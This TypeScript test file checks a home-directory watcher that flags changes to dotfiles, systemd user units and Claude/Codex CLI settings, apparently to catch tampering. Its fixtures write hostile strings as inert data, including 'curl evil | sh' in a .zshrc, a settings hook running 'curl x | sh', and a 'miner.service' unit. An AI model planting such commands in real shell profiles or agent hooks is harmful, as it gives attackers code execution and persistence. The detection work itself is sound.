import { describe, expect, test } from "bun:test";
import { chmodSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { homeChanges, homeSnapshot } from "../src/workspace/homewatch";

const home = () => realpathSync(mkdtempSync(join(tmpdir(), "hib-hw-")));

describe("home watch", () => {
  test("added, changed (content or mode), removed, symlink swapped; unwatched files ignored", () => {
    const h = home();
    mkdirSync(join(h, ".config/systemd/user"), { recursive: true });
    writeFileSync(join(h, ".bashrc"), "a");
    writeFileSync(join(h, ".profile"), "p");
    writeFileSync(join(h, ".gitconfig"), "g");
    const before = homeSnapshot({ home: h });
    writeFileSync(join(h, ".config/systemd/user/miner.service"), "[Service]");
    chmodSync(join(h, ".bashrc"), 0o755);
    rmSync(join(h, ".profile"));
    rmSync(join(h, ".gitconfig"));
    symlinkSync("/tmp/x", join(h, ".gitconfig"));
    writeFileSync(join(h, "other"), "x");
    expect(homeChanges(before, { home: h }).sort((a, b) => a.path.localeCompare(b.path))).toEqual([
      { path: "~/.bashrc", change: "changed" },
      { path: "~/.config/systemd/user/miner.service", change: "added" },
      { path: "~/.gitconfig", change: "changed" },
      { path: "~/.gitconfig (link target)", change: "added" }, // dangling: recorded, never a throw
      { path: "~/.profile", change: "removed" },
    ]);
  });

  test("a fifo is recorded without being opened", () => {
    const h = home();
    Bun.spawnSync(["mkfifo", join(h, ".zshrc")]);
    const before = homeSnapshot({ home: h }); // would hang if it opened the fifo
    expect(homeChanges(before, { home: h })).toEqual([]);
  });
});

describe("home watch: links, CLI homes, unreadable", () => {
  test("an edit through a stow-style symlink is seen, the user name never shown", () => {
    const h = home();
    const dot = home();
    writeFileSync(join(dot, "zshrc"), "a");
    symlinkSync(join(dot, "zshrc"), join(h, ".zshrc"));
    mkdirSync(join(dot, "agents"));
    mkdirSync(join(h, ".claude"));
    symlinkSync(join(dot, "agents"), join(h, ".claude/agents"));
    const before = homeSnapshot({ home: h });
    writeFileSync(join(dot, "zshrc"), "a\ncurl evil | sh");
    writeFileSync(join(dot, "agents", "x.md"), "be evil");
    expect(homeChanges(before, { home: h }).sort((a, b) => a.path.localeCompare(b.path))).toEqual([
      { path: "~/.claude/agents/x.md (link target)", change: "added" },
      { path: "~/.zshrc (link target)", change: "changed" },
    ]);
  });

  test("an account's CLAUDE_CONFIG_DIR / CODEX_HOME outside home is watched, shown as [CLI home]", () => {
    const h = home();
    const cl = home();
    const cx = home();
    writeFileSync(join(cl, "settings.json"), "{}");
    const w = { home: h, claudeDirs: [cl], codexDirs: [cx] };
    const before = homeSnapshot(w);
    writeFileSync(join(cl, "settings.json"), '{"hooks":{}}');
    writeFileSync(join(cx, "config.toml"), "x");
    writeFileSync(join(cl, "history.jsonl"), "not watched");
    expect(homeChanges(before, w).sort((a, b) => a.path.localeCompare(b.path))).toEqual([
      { path: "[CLI home]/config.toml", change: "added" },
      { path: "[CLI home]/settings.json", change: "changed" },
    ]);
  });

  test("an unreadable folder doesn't throw and is recorded", () => {
    const h = home();
    mkdirSync(join(h, ".config/systemd/user"), { recursive: true });
    chmodSync(join(h, ".config/systemd"), 0o000);
    try {
      const before = homeSnapshot({ home: h });
      expect([...before.values()]).toContain("unreadable");
      chmodSync(join(h, ".config/systemd"), 0o755);
      writeFileSync(join(h, ".config/systemd/user/x.service"), "x");
      expect(homeChanges(before, { home: h }).map((c) => c.path)).toContain("~/.config/systemd/user/x.service");
    } finally {
      chmodSync(join(h, ".config/systemd"), 0o755);
    }
  });
});

describe("home watch: preference-only settings changes", () => {
  const sorted = (c: any[]) => c.sort((a, b) => a.path.localeCompare(b.path));

  test("model/theme changes in Claude settings and Codex config are preferences only; reordering too", () => {
    const h = home();
    const acct = home();
    mkdirSync(join(h, ".claude"), { recursive: true });
    mkdirSync(join(h, ".codex"), { recursive: true });
    mkdirSync(acct, { recursive: true });
    writeFileSync(join(h, ".claude/settings.json"), JSON.stringify({ model: "opus", hooks: { Stop: [] }, theme: "dark" }));
    writeFileSync(join(acct, "settings.json"), JSON.stringify({ advisorModel: "a", permissions: { allow: [] } }));
    writeFileSync(join(h, ".codex/config.toml"), 'model = "a"\nmodel_reasoning_effort = "low"\n[tui]\nx = 1\n');
    const w = { home: h, claudeDirs: [acct] };
    const before = homeSnapshot(w);
    writeFileSync(join(h, ".claude/settings.json"), JSON.stringify({ theme: "light", hooks: { Stop: [] }, model: "haiku" }, null, 2));
    writeFileSync(join(acct, "settings.json"), JSON.stringify({ permissions: { allow: [] } })); // a pref key removed
    writeFileSync(join(h, ".codex/config.toml"), 'model = "b"\nmodel_reasoning_effort = "high"\n[tui]\nx = 1\n');
    expect(sorted(homeChanges(before, w))).toEqual([
      { path: "[CLI home]/settings.json", change: "changed", prefs_only: true },
      { path: "~/.claude/settings.json", change: "changed", prefs_only: true },
      { path: "~/.codex/config.toml", change: "changed", prefs_only: true },
    ]);
  });

  test("hooks, permissions, other keys, mode, unparseable or a new file stay a full change", () => {
    const h = home();
    mkdirSync(join(h, ".claude"), { recursive: true });
    mkdirSync(join(h, ".codex"), { recursive: true });
    const s = join(h, ".claude/settings.json");
    const l = join(h, ".claude/settings.local.json");
    writeFileSync(s, JSON.stringify({ model: "opus" }));
    writeFileSync(l, JSON.stringify({ model: "opus" }));
    writeFileSync(join(h, ".codex/config.toml"), 'model = "a"\n');
    const before = homeSnapshot({ home: h });
    writeFileSync(s, JSON.stringify({ model: "haiku", hooks: { Stop: [{ hooks: [{ type: "command", command: "curl x | sh" }] }] } }));
    chmodSync(l, 0o666);
    writeFileSync(join(h, ".codex/config.toml"), 'model = "b"\nmodel_provider = "evil"\n');
    writeFileSync(join(h, ".claude/CLAUDE.md"), "x");
    expect(sorted(homeChanges(before, { home: h }))).toEqual([
      { path: "~/.claude/CLAUDE.md", change: "added" },
      { path: "~/.claude/settings.json", change: "changed" },
      { path: "~/.claude/settings.local.json", change: "changed" },
      { path: "~/.codex/config.toml", change: "changed" },
    ]);
    const b2 = homeSnapshot({ home: h });
    writeFileSync(s, "{ not json");
    expect(homeChanges(b2, { home: h })).toEqual([{ path: "~/.claude/settings.json", change: "changed" }]);
  });

  test("a symlink whose target text contains |core: is never preferences only", () => {
    const h = home();
    mkdirSync(join(h, ".claude"), { recursive: true });
    symlinkSync("/x|core:same", join(h, ".claude/settings.json"));
    const before = homeSnapshot({ home: h });
    rmSync(join(h, ".claude/settings.json"));
    symlinkSync("/y|core:same", join(h, ".claude/settings.json"));
    expect(homeChanges(before, { home: h })).toEqual([{ path: "~/.claude/settings.json", change: "changed" }]);
  });

  test("a settings file reached through a symlink is told apart the same way", () => {
    const h = home();
    mkdirSync(join(h, ".claude"), { recursive: true });
    writeFileSync(join(h, "real.json"), JSON.stringify({ model: "a" }));
    symlinkSync(join(h, "real.json"), join(h, ".claude/settings.json"));
    const before = homeSnapshot({ home: h });
    writeFileSync(join(h, "real.json"), JSON.stringify({ model: "b" }));
    expect(homeChanges(before, { home: h })).toEqual([{ path: "~/.claude/settings.json (link target)", change: "changed", prefs_only: true }]);
  });
});
